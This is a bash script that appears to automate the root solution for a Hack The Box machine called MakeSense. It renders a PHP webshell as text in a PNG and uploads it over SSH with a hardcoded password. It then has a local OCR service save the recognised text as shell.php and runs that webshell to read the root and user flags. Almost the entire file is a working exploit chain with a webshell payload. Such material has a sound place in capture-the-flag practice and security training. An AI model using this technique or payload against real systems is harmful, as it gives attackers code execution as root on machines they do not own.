#!/bin/bash
# MakeSense HTB - Auto Root Exploit
# Usage: ./makesense_auto.sh <target_ip>

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

TARGET=$1
PASSWORD="JbhHDAEgXvri3!"

echo "[+] Creating shell.png image with PHP webshell..."
python3 -c "
from PIL import Image, ImageDraw, ImageFont
img = Image.new('RGB', (700, 60), 'white')
d = ImageDraw.Draw(img)
try:
    font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf', 18)
except:
    font = ImageFont.load_default()
d.text((5, 20), '<?php system(\$_GET[\"c\"]); ?>', fill='black', font=font)
img.save('shell.png')
"

echo "[+] Uploading shell.png to $TARGET..."
sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no shell.png "walter@$TARGET:/home/walter/"

echo "[+] Connecting via SSH and processing OCR..."
sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "walter@$TARGET" << 'ENDSSH'
    echo "[+] Encoding image and sending to OCR..."
    B64=$(base64 -w 0 ~/shell.png)
    OCR_ID=$(curl -s -c /tmp/jar -b /tmp/jar -X POST http://localhost:8001/ \
      -u 'walter:JbhHDAEgXvri3!' \
      --data-urlencode "canvas_image=data:image/png;base64,$B64" | \
      grep -oP 'ocr_id" value="\K[^"]+')
    echo "OCR_ID: $OCR_ID"

    echo "[+] Saving as shell.php..."
    curl -s -b /tmp/jar -X POST http://localhost:8001/ \
      -u 'walter:JbhHDAEgXvri3!' \
      --data "ocr_id=$OCR_ID&filename=shell.php&save_output=1" > /dev/null

    echo ""
    echo "[+] Executing webshell as root..."
    echo "--- ROOT FLAG ---"
    curl -s 'http://localhost:8001/saved/shell.php?c=cat%20/root/root.txt' -u 'walter:JbhHDAEgXvri3!'
    echo ""
    echo "--- USER FLAG ---"
    cat /home/walter/user.txt
ENDSSH

echo "[+] Cleaning up temporary files..."
rm -f shell.png

echo "[+] Done!"
